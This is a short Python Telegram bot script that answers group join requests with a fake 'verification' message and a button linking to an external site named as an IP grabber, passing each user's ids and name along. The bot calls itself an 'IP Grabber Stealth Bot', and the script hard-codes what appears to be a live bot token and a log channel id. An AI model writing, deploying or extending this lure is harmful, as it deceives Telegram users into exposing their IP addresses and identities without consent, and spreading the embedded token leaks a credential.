import telebot
from telebot import types
import os

BOT_TOKEN = "8901021055:AAGm6x5-1SY_6v2tNRXBZruygRXt29r8KVI"
WEB_URL = "https://ip-grabber-bot-production.up.railway.app"
LOG_CHANNEL = "-1002290475903"

print("Bot starting...")
print("BOT_TOKEN loaded successfully")
print("WEB_URL loaded:", WEB_URL)

bot = telebot.TeleBot(BOT_TOKEN)

# Clear old webhook / polling conflict
bot.remove_webhook()
print("Old webhook removed")

@bot.chat_join_request_handler()
def handle_join_request(request: types.ChatJoinRequest):
    user_id = request.user_chat_id
    chat_id = request.chat.id
    first_name = request.from_user.first_name or "User"

    link = f"{WEB_URL}/verify?chat_id={chat_id}&user_id={user_id}&name={first_name.replace(' ', '%20')}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Verify Account & Join Group", url=link))

    try:
        bot.send_message(
            user_id,
            "Human verification successful.\n\n"
            "Click the button below for final verification and to join the group.\n\n"
            "Link will expire in 10 minutes.",
            reply_markup=markup
        )
        print("Verification link sent to user", user_id)
    except Exception as e:
        print("Failed to send message to", user_id, ":", e)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "IP Grabber Stealth Bot is active.")

print("IP Grabber Stealth Bot is running...")
bot.infinity_polling()
